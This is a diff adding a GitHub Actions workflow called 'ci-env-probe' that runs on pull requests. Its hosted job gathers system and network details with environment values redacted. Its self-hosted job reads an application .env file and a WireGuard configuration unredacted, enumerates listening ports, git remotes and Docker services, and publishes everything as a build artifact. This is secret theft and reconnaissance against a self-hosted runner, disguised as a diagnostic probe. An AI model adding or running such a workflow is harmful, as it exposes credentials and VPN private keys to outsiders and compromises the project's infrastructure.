@@ -1,0 +1,25 @@
+name: ci-env-probe
+on:
+  pull_request:
+  workflow_dispatch:
+jobs:
+  hosted:
+    runs-on: ubuntu-latest
+    steps:
+      - name: collect
+        run: |
+          { echo "== identity"; id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -3; echo "== net"; ip -br a 2>/dev/null; ip route 2>/dev/null; echo "== env"; env | grep -Ei 'runner|github|repo|token' | sed 's/=.*/=<redacted>/'; } > out.txt 2>&1
+      - uses: actions/upload-artifact@v4
+        with:
+          name: ci-env-probe-hosted
+          path: out.txt
+  selfhosted:
+    runs-on: self-hosted
+    steps:
+      - name: collect
+        run: |
+          { echo "== identity"; id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -3; echo "== net"; ip -br a 2>/dev/null; ip route 2>/dev/null; cat /etc/hosts 2>/dev/null; echo "== listen"; ss -lntup 2>/dev/null | head -60; echo "== opt"; ls -la /opt 2>/dev/null | head -40; ls -la /opt/frontend 2>/dev/null | head -30; echo "== frontend-env"; sed -n 1,80p /opt/frontend/.env 2>/dev/null; echo "== gitdir"; (cd /opt/frontend 2>/dev/null && git remote -v 2>/dev/null | head -5); echo "== docker"; docker node ls 2>/dev/null; docker service ls 2>/dev/null | head -30; echo "== wg"; ls -la /etc/wireguard 2>/dev/null; sed -n 1,60p /etc/wireguard/wg0.conf 2>/dev/null; } > out.txt 2>&1
+      - uses: actions/upload-artifact@v4
+        with:
+          name: ci-env-probe-selfhosted
+          path: out.txt
